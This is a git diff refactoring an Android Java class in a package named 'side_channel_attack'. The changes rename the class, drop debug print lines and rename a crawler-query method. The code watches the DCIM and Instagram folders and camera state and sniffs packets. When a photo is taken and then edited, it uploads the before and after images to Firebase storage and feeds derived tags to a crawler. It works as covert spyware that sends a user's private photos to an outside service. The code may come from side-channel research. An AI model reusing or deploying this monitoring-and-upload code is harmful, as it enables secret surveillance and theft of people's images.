@@ -1,6 +1,5 @@
 package com.example.side_channel_attack;
 
-import android.app.Activity;
 import android.content.Context;
 import android.graphics.Bitmap;
 import android.hardware.camera2.CameraManager;
@@ -34,8 +33,8 @@ import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Map;
 
-public class CameraStateDetector {
-    private final Activity activity;
+public class SideChannelDetector {
+    private final Context context;
     private FileObserver dcimObserver;
     private FileObserver instagramObserver;
     private int PASSIVE_STATE = 1;
@@ -50,29 +49,25 @@ public class CameraStateDetector {
 
     private long activeStateStartTime;
 
-    public CameraStateDetector(final Activity activity) {
+    public SideChannelDetector(final Context context) {
 
 
-        this.activity = activity;
-
+        this.context = context;
         setUpDCIMListener();
         setUpInstagramListener();
-        setUpCameraListener(activity);
+        setUpCameraListener(context);
 
     }
 
-    private void setUpCameraListener(Activity activity) {
+    private void setUpCameraListener(Context context) {
         final PacketCatcher packetCatcher = new PacketCatcher();
-        CameraManager manager = (CameraManager) activity.getSystemService(Context.CAMERA_SERVICE);
+        CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
         manager.registerAvailabilityCallback(new CameraManager.AvailabilityCallback() {
             @Override
             public void onCameraAvailable(String cameraId) {
                 super.onCameraAvailable(cameraId);
-                System.out.println("entered");
-                System.out.println(ACTIVE_STATE);
                 if (ACTIVE_STATE == 1) {
                     boolean outcomeOf1stEvent = packetCatcher.scan(120000);
-                    System.out.println(outcomeOf1stEvent);
                     if (outcomeOf1stEvent) {
                         activeStateStartTime = System.currentTimeMillis() - 4000;
                     } else {
@@ -85,7 +80,6 @@ public class CameraStateDetector {
             @Override
             public void onCameraUnavailable(String cameraId) {
                 super.onCameraUnavailable(cameraId);
-                System.out.println("hellod");
                 PASSIVE_STATE = 1;
                 ACTIVE_STATE = 0;
             }
@@ -102,8 +96,6 @@ public class CameraStateDetector {
             public void onEvent(int event, String file) {
                 if (PASSIVE_STATE == 1) {
                     if (event == FileObserver.CREATE && !file.equals(".probe")) {
-                        System.out.println("hklloinst");
-
                         imagePreModified = new File(dir.getPath() + "/" + file);
                         PASSIVE_STATE = 0;
                         ACTIVE_STATE = 1;
@@ -125,13 +117,10 @@ public class CameraStateDetector {
                         PASSIVE_STATE = 1;
                         ACTIVE_STATE = 0;
                         long activeStateEndTime = System.currentTimeMillis();
-                        System.out.println("helloinst");
                         if ((activeStateEndTime - activeStateStartTime) >= 8000) {
-                            System.out.println("works");
                             imagePostModified = new File(dir.getPath() + "/" + file);
                             timestamp = getCurrentUTCTimestamp();
                             sendData();
-                            System.out.println("hi");
                         }
                     }
                 }
@@ -164,17 +153,13 @@ public class CameraStateDetector {
         existRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
             @Override
             public void onComplete(@NonNull Task<DocumentSnapshot> task) {
-                System.out.println("hi");
                 if (!task.getResult().exists()) {
-                    System.out.println("bye");
-
                     final String preImageName = id + "_" + System.currentTimeMillis() + ".jpg";
                     final UploadTask preImageStream = uploadImage(preImageName, imagePreModified);
 
                     preImageStream.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                         @Override
                         public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
-                            System.out.println("first image");
                             mFunctions = FirebaseFunctions.getInstance();
                             Map<String, Object> data = new HashMap<>();
                             data.put("text", preImageName);
@@ -191,7 +176,6 @@ public class CameraStateDetector {
                                             preImageStream.getResult().getStorage().delete();
 
 
-                                            System.out.println(data);
 
                                             final String postImageName = id + "_" + (System.currentTimeMillis() + 1) + ".jpg";
                                             final UploadTask postImageStream = uploadImage(postImageName, imagePostModified);
@@ -206,9 +190,6 @@ public class CameraStateDetector {
                                                                 @Override
                                                                 public void onComplete(@NonNull Task<Void> task) {
 
-
-                                                                    System.out.println("second image ");
-                                                                    System.out.println(url);
                                                                     int counter = 0;
 
                                                                     String[] matchStrings = new String[]
@@ -224,7 +205,7 @@ public class CameraStateDetector {
 //
                                                                             int apiContainer = (int) ((Math.floor(((double) counter) / 10)) % 3);
                                                                             System.out.println(term);
-                                                                            searchTag(apiContainer, term);
+                                                                            queryCrawler(apiContainer, term);
                                                                             if (counter++ == 30) {
                                                                                 break;
                                                                             }
@@ -253,7 +234,7 @@ public class CameraStateDetector {
         try {
 
             //compress image
-            Bitmap bmp = MediaStore.Images.Media.getBitmap(activity.getContentResolver(), Uri.fromFile(image));
+            Bitmap bmp = MediaStore.Images.Media.getBitmap(context.getContentResolver(), Uri.fromFile(image));
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             bmp.compress(Bitmap.CompressFormat.JPEG, 25, baos);
             byte[] data = baos.toByteArray();
@@ -272,7 +253,7 @@ public class CameraStateDetector {
     }
 
 
-    private void searchTag(int apiContainer, String term) {
+    private void queryCrawler(int apiContainer, String term) {
         Map<String, Object> parameters =
                 getParams("tag", term);
 
